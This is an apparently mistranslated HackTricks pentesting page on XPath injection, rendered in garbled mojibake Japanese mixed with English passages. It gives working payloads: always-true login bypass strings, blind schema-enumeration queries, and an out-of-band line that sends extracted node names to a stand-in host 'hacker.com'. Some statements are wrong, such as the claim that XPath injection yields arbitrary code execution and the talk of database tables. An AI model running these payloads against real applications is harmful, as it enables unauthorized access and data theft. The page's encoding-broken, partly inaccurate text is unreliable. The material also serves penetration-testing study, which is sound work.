# XPATHã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ãŠã‚ˆã³** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofã¯ã™ã¹ã¦ã®æš—å·ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®ãƒ›ãƒ¼ãƒ ã§ã™ã€‚**

**é…å»¶ãªã—ã§å ±é…¬ã‚’å—ã‘å–ã‚‹**\
HackenProofã®ãƒã‚¦ãƒ³ãƒ†ã‚£ã¯ã€é¡§å®¢ãŒå ±é…¬äºˆç®—ã‚’å…¥é‡‘ã—ãŸå¾Œã«ã®ã¿é–‹å§‹ã•ã‚Œã¾ã™ã€‚ãƒã‚°ãŒæ¤œè¨¼ã•ã‚ŒãŸå¾Œã«å ±é…¬ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Web3ãƒšãƒ³ãƒˆestingã®çµŒé¨“ã‚’ç©ã‚€**\
ãƒ–ãƒ­ãƒƒã‚¯ãƒã‚§ãƒ¼ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒˆãƒ©ã‚¯ãƒˆã¯æ–°ã—ã„ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã™ï¼ãã®æˆé•·æœŸã«ãŠã‘ã‚‹web3ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚

**Web3ãƒãƒƒã‚«ãƒ¼ãƒ¬ã‚¸ã‚§ãƒ³ãƒ‰ã«ãªã‚‹**\
å„æ¤œè¨¼æ¸ˆã¿ã®ãƒã‚°ã”ã¨ã«è©•åˆ¤ãƒã‚¤ãƒ³ãƒˆã‚’ç²å¾—ã—ã€é€±é–“ãƒªãƒ¼ãƒ€ãƒ¼ãƒœãƒ¼ãƒ‰ã®ãƒˆãƒƒãƒ—ã‚’åˆ¶è¦‡ã—ã¾ã—ã‚‡ã†ã€‚

[**HackenProofã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**](https://hackenproof.com/register)ã—ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã‹ã‚‰åç›Šã‚’å¾—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://hackenproof.com/register" %}

## **åŸºæœ¬æ§‹æ–‡**

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæä¾›ã—ãŸå…¥åŠ›ã‹ã‚‰XPathï¼ˆXMLãƒ‘ã‚¹è¨€èªï¼‰ã‚¯ã‚¨ãƒªã‚’æ§‹ç¯‰ã—ã¦XMLãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ã‚¯ã‚¨ãƒªã¾ãŸã¯ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã™ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã®æ”»æ’ƒæŠ€è¡“ã§ã™ã€‚

ã‚¯ã‚¨ãƒªã®ä½œæˆæ–¹æ³•ã«é–¢ã™ã‚‹æƒ…å ±ï¼š[https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

### ãƒãƒ¼ãƒ‰

| å¼         | èª¬æ˜                                                                                                 |
| ---------- | ---------------------------------------------------------------------------------------------------- |
| nodename   | åå‰ãŒã€Œnodenameã€ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚                                                     |
| /          | ãƒ«ãƒ¼ãƒˆãƒãƒ¼ãƒ‰ã‹ã‚‰é¸æŠã—ã¾ã™ã€‚                                                                         |
| //         | ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆå†…ã®é¸æŠã«ä¸€è‡´ã™ã‚‹ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚ã©ã“ã«ã‚ã£ã¦ã‚‚é¸æŠã—ã¾ã™ã€‚         |
| .          | ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚                                                                           |
| ..         | ç¾åœ¨ã®ãƒãƒ¼ãƒ‰ã®è¦ªã‚’é¸æŠã—ã¾ã™ã€‚                                                                       |
| @          | å±æ€§ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                   |

### **ä¾‹:**

| ãƒ‘ã‚¹ã®å¼         | çµæœ                                                                                                                                 |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| bookstore       | åå‰ãŒã€Œbookstoreã€ã®ã™ã¹ã¦ã®ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                     |
| /bookstore      | bookstoreè¦ç´ ã‚’é¸æŠã—ã¾ã™**æ³¨ï¼š**ãƒ‘ã‚¹ãŒã‚¹ãƒ©ãƒƒã‚·ãƒ¥ï¼ˆ/ï¼‰ã§å§‹ã¾ã‚‹å ´åˆã€å¸¸ã«è¦ç´ ã¸ã®çµ¶å¯¾ãƒ‘ã‚¹ã‚’è¡¨ã—ã¾ã™ã€‚                                |
| bookstore/book  | bookstoreã®å­ã§ã‚ã‚‹ã™ã¹ã¦ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                      |
| //book          | ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆå†…ã®ã©ã“ã«ã‚ã£ã¦ã‚‚ã€ã™ã¹ã¦ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                         |
| bookstore//book | bookstoreè¦ç´ ã®å­å­«ã§ã‚ã‚‹ã™ã¹ã¦ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚ã©ã“ã«ã‚ã£ã¦ã‚‚ã€bookstoreè¦ç´ ã®ä¸‹ã«ã‚ã‚‹ã‹ã©ã†ã‹ã¯é–¢ä¿‚ã‚ã‚Šã¾ã›ã‚“ã€‚                 |
| //@lang         | åå‰ãŒlangã§ã‚ã‚‹ã™ã¹ã¦ã®å±æ€§ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                             |

### è¿°èª

| ãƒ‘ã‚¹ã®å¼                     | çµæœ                                                                                                                                                                                                                                                                                                         |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /bookstore/book\[1]         | <p>bookstoreè¦ç´ ã®å­ã§ã‚ã‚‹æœ€åˆã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚<strong>æ³¨:</strong> IE 5,6,7,8,9ã§ã¯æœ€åˆã®ãƒãƒ¼ãƒ‰ã¯[0]ã§ã™ãŒã€W3Cã«ã‚ˆã‚‹ã¨[1]ã§ã™ã€‚ã“ã®å•é¡Œã‚’IEã§è§£æ±ºã™ã‚‹ã«ã¯ã€SelectionLanguageã‚’XPathã«è¨­å®šã—ã¾ã™ã€‚</p><p>JavaScriptã§ã®è¨­å®šæ–¹æ³•ï¼šxml.setProperty("SelectionLanguage","XPath");</p> |
| /bookstore/book\[last()]    | bookstoreè¦ç´ ã®å­ã§ã‚ã‚‹æœ€å¾Œã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                                       |
| /bookstore/book\[last()-1]  | bookstoreè¦ç´ ã®å­ã§ã‚ã‚‹æœ€å¾Œã‹ã‚‰2ç•ªç›®ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                                 |
| /bookstore/book\[position()<3] | bookstoreè¦ç´ ã®å­ã§ã‚ã‚‹æœ€åˆã®2ã¤ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                                 |
| //title\[@lang]             | langã¨ã„ã†åå‰ã®å±æ€§ã‚’æŒã¤ã™ã¹ã¦ã®titleè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                                               |
| //title\[@lang='en']        | å€¤ãŒã€Œenã€ã®ã€Œlangã€å±æ€§ã‚’æŒã¤ã™ã¹ã¦ã®titleè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                                           |
| /bookstore/book\[price>35.00] | bookstoreè¦ç´ ã®bookè¦ç´ ã§ã€ä¾¡æ ¼è¦ç´ ã®å€¤ãŒ35.00ã‚ˆã‚Šå¤§ãã„ã™ã¹ã¦ã®bookè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                   |
| /bookstore/book\[price>35.00]/title | bookstoreè¦ç´ ã®bookè¦ç´ ã§ã€ä¾¡æ ¼è¦ç´ ã®å€¤ãŒ35.00ã‚ˆã‚Šå¤§ãã„ã™ã¹ã¦ã®titleè¦ç´ ã‚’é¸æŠã—ã¾ã™ã€‚                                                                                                                                                                                                                   |

### ä¸æ˜ãªãƒãƒ¼ãƒ‰

| ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ | èª¬æ˜                   |
| ------------ | --------------------- |
| \*           | ä»»æ„ã®è¦ç´ ãƒãƒ¼ãƒ‰ã«ä¸€è‡´ |
| @\*          | ä»»æ„ã®å±æ€§ãƒãƒ¼ãƒ‰ã«ä¸€è‡´ |
| node()       | ä»»æ„ã®ç¨®é¡ã®ãƒãƒ¼ãƒ‰ã«ä¸€è‡´ |
### **ä¾‹:**

| ãƒ‘ã‚¹å¼ | çµæœ |
| --------------- | ------------------------------------------------------------------------ |
| /bookstore/\*   | bookstoreè¦ç´ ã®ã™ã¹ã¦ã®å­è¦ç´ ãƒãƒ¼ãƒ‰ã‚’é¸æŠã—ã¾ã™ |
| //\*            | ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆå†…ã®ã™ã¹ã¦ã®è¦ç´ ã‚’é¸æŠã—ã¾ã™ |
| //title\[@\*]   | ä»»æ„ã®ç¨®é¡ã®å±æ€§ã‚’æŒã¤ã™ã¹ã¦ã®titleè¦ç´ ã‚’é¸æŠã—ã¾ã™ |

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProofã¯ã™ã¹ã¦ã®æš—å·ãƒã‚°å ±é…¬ã®å ´æ‰€ã§ã™ã€‚**

**é…å»¶ãªã—ã§å ±é…¬ã‚’å—ã‘å–ã‚‹**\
HackenProofã®å ±é…¬ã¯ã€é¡§å®¢ãŒå ±é…¬äºˆç®—ã‚’å…¥é‡‘ã—ãŸå¾Œã«ã®ã¿é–‹å§‹ã•ã‚Œã¾ã™ã€‚ãƒã‚°ãŒæ¤œè¨¼ã•ã‚ŒãŸå¾Œã«å ±é…¬ã‚’å—ã‘å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**Web3ãƒšãƒ³ãƒˆestingã®çµŒé¨“ã‚’ç©ã‚€**\
ãƒ–ãƒ­ãƒƒã‚¯ãƒã‚§ãƒ¼ãƒ³ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨ã‚¹ãƒãƒ¼ãƒˆã‚³ãƒ³ãƒˆãƒ©ã‚¯ãƒˆã¯æ–°ã—ã„ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§ã™ï¼ãã®æˆé•·ã™ã‚‹æ—¥ã€…ã«ãŠã„ã¦ã€web3ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ãƒã‚¹ã‚¿ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚

**Web3ãƒãƒƒã‚«ãƒ¼ãƒ¬ã‚¸ã‚§ãƒ³ãƒ‰ã«ãªã‚‹**\
å„æ¤œè¨¼æ¸ˆã¿ã®ãƒã‚°ã”ã¨ã«è©•åˆ¤ãƒã‚¤ãƒ³ãƒˆã‚’ç²å¾—ã—ã€é€±é–“ãƒªãƒ¼ãƒ€ãƒ¼ãƒœãƒ¼ãƒ‰ã®ãƒˆãƒƒãƒ—ã‚’åˆ¶è¦‡ã—ã¾ã—ã‚‡ã†ã€‚

[**HackenProofã§ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**](https://hackenproof.com/register) ãƒãƒƒã‚¯ã‹ã‚‰åç›Šã‚’å¾—ã¾ã—ã‚‡ã†ï¼

{% embed url="https://hackenproof.com/register" %}

## ä¾‹
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### æƒ…å ±ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

XPath Injection is a technique used to exploit vulnerabilities in web applications that use XPath to query XML data. By injecting malicious XPath expressions into user input fields, an attacker can manipulate the XPath query and gain unauthorized access to sensitive information.

XPath is a language used to navigate XML documents and extract data. It uses path expressions to select nodes or sets of nodes in an XML document. In web applications, XPath is commonly used to query XML data stored in databases or retrieved from external sources.

To perform an XPath Injection attack, an attacker needs to identify a vulnerable input field that is used in an XPath query. This can be a search box, a login form, or any other user input field that is used to construct an XPath query.

Once a vulnerable input field is identified, the attacker can start injecting malicious XPath expressions. These expressions are designed to manipulate the XPath query and extract sensitive information from the XML data.

For example, consider a web application that uses XPath to query a database of user information. The application allows users to search for other users by their username. The XPath query used by the application might look like this:

```
//users/user[username='input']
```

In this example, the `input` parameter is the user-supplied value that is used in the XPath query. An attacker can exploit this vulnerability by injecting a malicious XPath expression that always evaluates to true, such as:

```
' or 1=1 or 'a'='a
```

By injecting this expression into the username field, the attacker can manipulate the XPath query to return all user records instead of just the one matching the supplied username. This allows the attacker to access sensitive information about all users in the database.

XPath Injection attacks can be prevented by properly validating and sanitizing user input before using it in an XPath query. Input validation should include checking for special characters and escaping them if necessary. Additionally, using parameterized queries or prepared statements can help protect against XPath Injection attacks by separating user input from the query logic.

By understanding and exploiting XPath Injection vulnerabilities, a penetration tester can help organizations identify and fix security flaws in their web applications, ensuring the protection of sensitive information.
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### ã‚¹ã‚­ãƒ¼ãƒã®ç‰¹å®šã¨ç›—ã¿å‡ºã—

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ã‚¹ã‚­ãƒ¼ãƒã‚’ç‰¹å®šã—ã€ãã®æƒ…å ±ã‚’ç›—ã¿å‡ºã™æ”»æ’ƒæ‰‹æ³•ã§ã™ã€‚

æ”»æ’ƒè€…ã¯ã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®å…¥åŠ›ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«å¯¾ã—ã¦æ”¹å¤‰ã•ã‚ŒãŸXPathã‚¯ã‚¨ãƒªã‚’æ³¨å…¥ã—ã¾ã™ã€‚ã“ã®æ³¨å…¥ã•ã‚ŒãŸã‚¯ã‚¨ãƒªã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¯¾ã—ã¦å®Ÿè¡Œã™ã‚‹XPathã‚¯ã‚¨ãƒªã¨ã—ã¦è§£é‡ˆã•ã‚Œã¾ã™ã€‚

æ”»æ’ƒè€…ã¯ã€æ³¨å…¥ã•ã‚ŒãŸXPathã‚¯ã‚¨ãƒªã‚’åˆ©ç”¨ã—ã¦ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã®ã‚¹ã‚­ãƒ¼ãƒæƒ…å ±ã‚’ç‰¹å®šã—ã¾ã™ã€‚XPathã‚¯ã‚¨ãƒªã®çµæœã‚’åˆ†æã™ã‚‹ã“ã¨ã§ã€ãƒ†ãƒ¼ãƒ–ãƒ«åã€ã‚«ãƒ©ãƒ åã€ãƒ‡ãƒ¼ã‚¿å‹ãªã©ã®é‡è¦ãªæƒ…å ±ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚¹ã‚­ãƒ¼ãƒæƒ…å ±ã‚’ç›—ã¿å‡ºã—ãŸå¾Œã€æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‹ã‚‰ã•ã‚‰ãªã‚‹æ©Ÿå¯†æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€ã‚¹ã‚­ãƒ¼ãƒæƒ…å ±ã‚’åˆ©ç”¨ã—ã¦ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®ãƒ‡ãƒ¼ã‚¿ã‚’æ”¹ã–ã‚“ã—ãŸã‚Šã€ä»–ã®æ”»æ’ƒæ‰‹æ³•ã‚’å±•é–‹ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã‚’é˜²ããŸã‚ã«ã¯ã€é©åˆ‡ãªå…¥åŠ›æ¤œè¨¼ã¨ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ãŒå¿…è¦ã§ã™ã€‚ã¾ãŸã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ„è­˜ã®é«˜ã„é–‹ç™ºæ‰‹æ³•ã‚’æ¡ç”¨ã—ã€è„†å¼±æ€§è¨ºæ–­ã‚„ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆã‚’å®šæœŸçš„ã«å®Ÿæ–½ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## èªè¨¼ãƒã‚¤ãƒ‘ã‚¹

### **ã‚¯ã‚¨ãƒªã®ä¾‹ï¼š**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ORãƒã‚¤ãƒ‘ã‚¹ï¼ˆä¸¡æ–¹ã«åŒã˜å€¤ã‚’ä½¿ç”¨ï¼‰**

In some cases, when a web application uses XPath queries to authenticate users, it is possible to bypass the login mechanism by injecting a specific payload. This technique is known as XPath Injection.

ã„ãã¤ã‹ã®å ´åˆã€Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒXPathã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’èªè¨¼ã™ã‚‹å ´åˆã€ç‰¹å®šã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã§ãƒ­ã‚°ã‚¤ãƒ³ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æŠ€è¡“ã¯XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚

XPath is a language used to navigate XML documents and is commonly used in web applications to extract data from XML-based responses. However, if the application does not properly sanitize user input, an attacker can manipulate the XPath query to execute arbitrary code.

XPathã¯ã€XMLãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ãƒŠãƒ“ã‚²ãƒ¼ãƒˆã™ã‚‹ãŸã‚ã®è¨€èªã§ã‚ã‚Šã€XMLãƒ™ãƒ¼ã‚¹ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’æŠ½å‡ºã™ã‚‹ãŸã‚ã«Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ä¸€èˆ¬çš„ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã—ã‹ã—ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å…¥åŠ›ã‚’é©åˆ‡ã«ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã—ãªã„å ´åˆã€æ”»æ’ƒè€…ã¯XPathã‚¯ã‚¨ãƒªã‚’æ“ä½œã—ã¦ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

One common scenario where XPath Injection can be exploited is when the application uses the same value for both the username and password fields during authentication. By injecting a payload that results in a true condition, the attacker can bypass the login mechanism and gain unauthorized access to the application.

XPathã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ãŒæ‚ªç”¨ã•ã‚Œã‚‹ä¸€èˆ¬çš„ãªã‚·ãƒŠãƒªã‚ªã®1ã¤ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒèªè¨¼ä¸­ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ä¸¡æ–¹ã«åŒã˜å€¤ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã§ã™ã€‚çœŸã®æ¡ä»¶ã‚’çµæœã¨ã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ãƒ­ã‚°ã‚¤ãƒ³ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

To perform an OR bypass in the username and password fields, the attacker can inject the following payload:

ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã§ORãƒã‚¤ãƒ‘ã‚¹ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€æ”»æ’ƒè€…ã¯æ¬¡ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```
' or '1'='1
```

This payload manipulates the XPath query to always evaluate to true, bypassing the authentication check. The injected payload effectively changes the query to `'username' = 'username' or '1'='1' and 'password' = 'password'`, which will always be true.

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€XPathã‚¯ã‚¨ãƒªã‚’å¸¸ã«trueã«è©•ä¾¡ã™ã‚‹ã‚ˆã†ã«æ“ä½œã—ã€èªè¨¼ãƒã‚§ãƒƒã‚¯ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚æ³¨å…¥ã•ã‚ŒãŸãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€ã‚¯ã‚¨ãƒªã‚’`'username' = 'username' or '1'='1' and 'password' = 'password'`ã«åŠ¹æœçš„ã«å¤‰æ›´ã—ã€å¸¸ã«trueã«ãªã‚Šã¾ã™ã€‚

By injecting this payload, the attacker can log in to the application without providing valid credentials, effectively bypassing the authentication mechanism.

